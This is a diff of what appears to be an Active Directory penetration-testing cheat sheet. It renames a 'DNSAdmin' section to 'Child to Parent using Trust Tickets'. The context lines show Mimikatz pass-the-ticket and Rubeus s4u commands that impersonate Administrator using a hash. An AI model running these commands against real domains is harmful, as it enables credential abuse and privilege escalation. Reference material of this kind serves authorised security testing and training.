@@ -31,7 +31,7 @@ Last update: **21 Nov 2021**
      -  [Unconstrained Delegation](#unconstrained-delegation)
         -  [Printer Bug](#printer-bug)
      -  [Constrained Delegation](#constrained-delegation)
-  -  [DNSAdmin](#dnsadmin)
+  -  [Child to Parent using Trust Tickets](#Child-to-Parent-using-Trust-Tickets)
 
 ## Pre-requisites
 ### Using PowerView:
@@ -560,7 +560,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 .\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<domain>" /ptt
 ```
 
-### DNSAdmin
+### Child to Parent using Trust Tickets
 
 **1. Enumeration with Powerview:**
 ```powershell
